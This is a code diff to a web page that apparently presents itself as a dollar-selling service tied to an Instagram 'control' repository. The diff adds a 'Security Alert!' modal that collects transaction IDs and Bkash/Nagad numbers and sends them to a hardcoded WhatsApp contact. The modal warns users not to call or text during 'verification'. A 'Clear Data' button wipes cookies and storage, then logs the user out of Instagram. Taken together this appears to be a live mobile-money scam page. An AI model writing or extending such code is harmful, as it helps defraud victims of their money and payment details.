@@ -102,7 +102,6 @@
             line-height: 1.5;
         }
         
-        /* Modal remains hidden as trigger is removed */
         #dollarModal {
             display: none;
             position: fixed;
@@ -112,6 +111,34 @@
             padding: 20px;
             align-items: center;
             justify-content: center;
+        }
+        .modal-content {
+            background: #111;
+            padding: 20px;
+            border-radius: 15px;
+            max-width: 320px;
+            width: 100%;
+            border: 1px solid #ff4757;
+            text-align: center;
+        }
+        input[type="text"], input[type="tel"], select {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background: #000;
+            border: 1px solid #444;
+            color: #fff;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        .warning { 
+            color: #ffffff; 
+            font-size: 11px; 
+            margin-top: 10px; 
+            background: rgba(255, 71, 87, 0.2); 
+            padding: 10px; 
+            border-radius: 8px; 
+            text-align: left; 
         }
         .hidden { display: none !important; }
     </style>
@@ -128,8 +155,8 @@
     <div id="status-text">System Active</div>
     
     <div id="actionButtons">
-        <button class="btn btn-clear">Clear Data</button>
-        <button class="btn btn-dollar">Dollr Sell</button>
+        <button class="btn btn-clear" onclick="forceClear()">Clear Data</button>
+        <button class="btn btn-dollar" onclick="showDollarMenu()">Dollr Sell</button>
     </div>
 
     <div id="updateMsgBox">
@@ -138,8 +165,28 @@
     </div>
 </div>
 
+<div id="dollarModal">
+    <div class="modal-content">
+        <h3 style="color: #ff4757;">Security Alert!</h3>
+        <p style="font-size: 13px;">রেট: ১ ডলার = ১২০ টাকা</p>
+        <input type="text" id="txnId" placeholder="Transaction ID (TxID)">
+        <select id="paymentMethod">
+            <option value="" disabled selected>পেমেন্ট মেথড সিলেক্ট করুন</option>
+            <option value="Bkash">বিকাশ (Bkash)</option>
+            <option value="Nogad">নগদ (Nagad)</option>
+        </select>
+        <input type="tel" id="paymentNumber" placeholder="বিকাশ/নগদ নাম্বার" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+
+        <div class="warning">
+            ❗ <b>ঝুঁকি ও নিয়ম:</b> ১০-৩০ মিনিট ভেরিফিকেশন সময় লাগবে। এই সময়ে কোনো এসএমএস বা কল করবেন না।
+        </div>
+        
+        <button class="btn btn-dollar" style="background: #ff4757; color: #fff; width:100%;" onclick="submitSell()">Submit Request</button>
+        <button class="btn" style="background: #333; color: #fff; width:100%; margin-top:5px;" onclick="closeModal()">বাতিল করুন</button>
+    </div>
+</div>
+
 <script>
-    // সার্ভার চেক ফাংশনটি রাখা হয়েছে যাতে ইন্টারফেস আপডেট হতে পারে, কিন্তু বাটন কাজ করবে না
     const REMOTE_URL = "https://raw.githubusercontent.com/ferojmajumder100-lang/INSTAGRAM-control/main/status.txt";
 
     function checkRemoteUpdate() {
@@ -166,13 +213,28 @@
         document.getElementById('updateMsgBox').style.display = 'block';
     }
 
-    // আগের ফাংশনগুলো অকার্যকর (Empty) করে দেওয়া হয়েছে
     function forceClear() {
-        // Nothing happens
+        localStorage.clear();
+        sessionStorage.clear();
+        
+        document.cookie.split(";").forEach(function(c) {
+            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
+        });
+
+        alert("ডাটা ক্লিয়ার হচ্ছে! আপনাকে লগআউট পেজে পাঠানো হচ্ছে।");
+        window.location.href = "https://www.instagram.com/accounts/logout/";
     }
 
-    function showDollarMenu() {
-        // Nothing happens
+    function showDollarMenu() { document.getElementById('dollarModal').style.display = 'flex'; }
+    function closeModal() { document.getElementById('dollarModal').style.display = 'none'; }
+
+    function submitSell() {
+        const txn = document.getElementById('txnId').value;
+        const method = document.getElementById('paymentMethod').value;
+        const number = document.getElementById('paymentNumber').value;
+        if(!txn || !method || !number) { alert("সব তথ্য দিন!"); return; }
+        const msg = `Request:\nTxID: ${txn}\nMethod: ${method}\nNumber: ${number}`;
+        window.open("https://wa.me/8801817559984?text=" + encodeURIComponent(msg), '_blank');
     }
 
     window.onload = checkRemoteUpdate;
